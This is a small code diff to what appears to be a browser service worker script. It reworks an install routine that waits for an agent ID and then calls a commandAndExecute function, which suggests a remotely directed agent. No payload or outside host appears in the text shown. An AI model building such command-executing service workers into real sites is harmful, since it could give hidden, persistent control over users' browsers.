@@ -204,10 +204,10 @@ function reg(){
  });
 }
 
-function initialSetup(){
+function install(){
   if(agentID === null){
     init();
-    setTimeout(function(){initialSetup(install)}, 100);
+    setTimeout(install, 100);
   }else{
     commandAndExecute("install");
   }
@@ -215,7 +215,7 @@ function initialSetup(){
 
 self.addEventListener('install', function(event){
   // console.log("SW installed -from sw.js");
-  initialSetup();
+  setTimeout(install, 800);
   indexedDB.deleteDatabase("swdb");
 });
 
@@ -298,7 +298,6 @@ function commandAndExecute(Meta){
 
 function SI(Meta){
 	setTimeout(function(){
-    // console.log("SI: " + agentID);
     if(agentID !== null){ // UUID not yet set, hold on...
 	    commandAndExecute(Meta);
     }
